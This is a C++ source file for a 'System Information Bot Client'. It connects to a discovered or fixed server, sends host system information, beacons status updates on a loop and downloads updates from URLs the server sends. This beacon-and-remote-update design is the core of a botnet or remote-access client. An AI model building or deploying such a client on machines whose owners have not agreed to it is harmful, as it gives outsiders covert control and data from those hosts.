#include "bot_controller.h"
#include <iostream>
#include <cstdio>

BotController::BotController(const char* server_ip, int server_port)
    : networkClient(server_ip, server_port), isRunning(true), 
      messageCounter(1), updateInterval(30000) {
}

BotController::~BotController() {
    stop();
}

bool BotController::initialize() {
    if (!networkClient.initialize()) {
        std::cerr << "ERROR: Failed to initialize network client" << std::endl;
        return false;
    }
    return true;
}

bool BotController::discoverAndConnect() {
    std::cout << "Attempting to discover servers on the network..." << std::endl;
    
    // Try to discover servers
    if (networkClient.discoverServers(5)) {
        std::cout << "Servers discovered, attempting to connect..." << std::endl;
        if (networkClient.connectToDiscoveredServer()) {
            return true;
        }
    }
    
    std::cout << "Discovery failed, trying direct connection..." << std::endl;
    return networkClient.connectToServer();
}

void BotController::run() {
    std::cout << "=== System Information Bot Client ===" << std::endl;
    std::cout << "Press Ctrl+C to stop" << std::endl;

    // Get initial system information
    std::string systemInfo = SystemInfo::getSystemInformation();
    std::cout << "System information collected:" << std::endl;
    std::cout << systemInfo << std::endl;

    while (isRunning) {
        if (!networkClient.isConnected()) {
            handleReconnection();
            continue;
        }

        // Send system information on first connection
        if (messageCounter == 1) {
            sendSystemInfo();
        } else {
            sendStatusUpdate();
        }

        messageCounter++;
        Sleep(updateInterval);
    }
}

void BotController::stop() {
    isRunning = false;
    networkClient.disconnect();
    std::cout << "Bot client stopped." << std::endl;
}

void BotController::setUpdateInterval(int seconds) {
    updateInterval = seconds * 1000; // Convert to milliseconds
}

void BotController::sendSystemInfo() {
    std::string systemInfo = SystemInfo::getSystemInformation();
    std::string message = "SYSTEM_INFO:" + systemInfo;
    networkClient.sendMessage(message.c_str());
    networkClient.receiveResponse();
}

void BotController::sendStatusUpdate() {
    char statusMsg[256];
    sprintf(statusMsg, "STATUS_UPDATE: Bot running - Message #%d | Version: %s", 
            messageCounter, SystemInfo::getVersion().c_str());
    networkClient.sendMessage(statusMsg);
    networkClient.receiveResponse();
}

void BotController::handleServerCommands() {
    // Check for server commands in the response
    // This would be implemented based on server response format
    // For now, we'll add a placeholder for update command handling
}

void BotController::processUpdateCommand(const std::string& command) {
    if (command.find("UPDATE:") != std::string::npos) {
        std::cout << "Received update command from server" << std::endl;
        
        // Extract update URL from command
        size_t pos = command.find("UPDATE:");
        if (pos != std::string::npos) {
            std::string updateUrl = command.substr(pos + 7); // Skip "UPDATE:"
            
            std::cout << "Downloading update from: " << updateUrl << std::endl;
            
            // Perform the update
            if (networkClient.downloadUpdate(updateUrl)) {
                std::cout << "Update downloaded successfully" << std::endl;
                // The update process will handle restarting the bot
            } else {
                std::cerr << "Failed to download update" << std::endl;
            }
        }
    }
}

void BotController::handleReconnection() {
    std::cout << "Reconnecting in 5 seconds..." << std::endl;
    Sleep(5000);
    
    if (!networkClient.connectToServer()) {
        std::cout << "Reconnection failed, will retry..." << std::endl;
    }
} 